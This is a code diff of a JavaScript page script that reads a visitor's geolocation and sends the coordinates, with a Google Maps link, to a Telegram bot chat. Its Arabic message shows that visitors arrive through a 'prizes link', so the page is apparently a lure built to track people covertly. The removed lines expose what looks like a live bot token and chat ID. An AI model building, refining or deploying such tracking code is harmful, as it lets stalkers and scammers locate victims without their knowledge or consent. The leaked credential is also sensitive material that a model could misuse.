@@ -14,16 +14,22 @@ function sendLocation(position) {
   const lon = position.coords.longitude;
   const acc = position.coords.accuracy;
 
+  const googleMapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
+
   const message = `
-مستخدم جديد فتح الرابط:
-موقعه:
-خط العرض: ${lat}
-خط الطول: ${lon}
-دقة الموقع: ${acc} متر
+مستخدم جديد فتح رابط الجوائز:
+
+📍 الموقع الجغرافي:
+- خط العرض: ${lat}
+- خط الطول: ${lon}
+- دقة الموقع: ${acc} متر
+
+رابط مباشر للموقع:
+${googleMapsLink}
   `;
 
-  const token = "7874509299:AAEXnwpKl-m7E2pVuuYWxfixW-YC1oZ3Ng0"; // استبدله بتوكن البوت الحقيقي
-  const chatId = "6817512459"; // ID الخاص بك على التليجرام
+  const token = "TOKEN"; // ← استبدل بالتوكن الحقيقي
+  const chatId = "0000"; // ← استبدل بـ ID التليجرام الحقيقي
   const url = `https://api.telegram.org/bot${token}/sendMessage`;
 
   fetch(url, {
